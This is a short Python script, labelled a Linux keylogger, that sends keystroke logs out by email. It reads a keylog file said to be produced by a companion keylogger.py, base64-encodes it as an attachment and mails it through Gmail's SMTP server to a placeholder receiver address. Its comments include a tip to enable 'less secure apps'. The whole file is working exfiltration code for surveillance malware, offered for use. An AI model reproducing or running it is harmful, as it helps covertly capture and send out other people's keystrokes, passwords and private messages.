#! /usr/bin/env python
# Python keylogger                     
# Use it in LINUX

try:    #import required modules
    import email, smtplib, ssl
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import getpass
except ModuleNotFoundError:
    print("Please install all required modules")
    exit(1)

subject = "Python Keylogger"
body = "This is an email with Keylogs from Python Keylogger"
sender_email = "myemail@gmail.com"                       #Please Enable less secure apps 
receiver_email = "youremail@gmail.com"                        #access your gmail in settings
password = getpass.getpass("Type your password and press enter:")

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "/home/d_captainkenya/keylogs.txt"           #provide txt file created by keylogger.py

# Open PDF file in binary mode
try:
    with open(filename, "rb") as attachment:
    # Add file as application/octet-stream for Email client to download automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()
except FileNotFoundError:
    print("Check keylog file path")
    exit(1)
except:
    print("Error ocurred")
    exit(1)
    
# Log in to server using secure context and send email
try:
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    print("Done...")
except:
    print("Server or Internet Error ocurred")

